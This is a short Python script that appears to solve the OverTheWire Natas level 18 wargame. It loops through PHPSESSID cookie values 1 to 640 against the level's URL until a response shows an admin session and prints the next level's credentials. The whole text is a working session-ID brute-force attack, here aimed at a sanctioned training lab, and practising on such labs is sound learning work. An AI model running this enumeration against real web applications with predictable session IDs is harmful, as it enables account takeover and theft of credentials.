import requests

auth = ("natas18", "[PW_HERE]")
url = "http://natas18.natas.labs.overthewire.org"

for i in range(1, 641):
	session_id = str(i)
	cookies = {"PHPSESSID": session_id}
	
	response = requests.get(url, auth=auth, cookies=cookies)
	
	if "You are an admin. The credentials for the next level are:" in response.text:
		print(f"[+] Found admin session cookie: {i} (PHPSESSID: {session_id})")
		print(response.text)
		break
		
	else:
		print(f"[*] Tried session ID {i} ({session_id})")


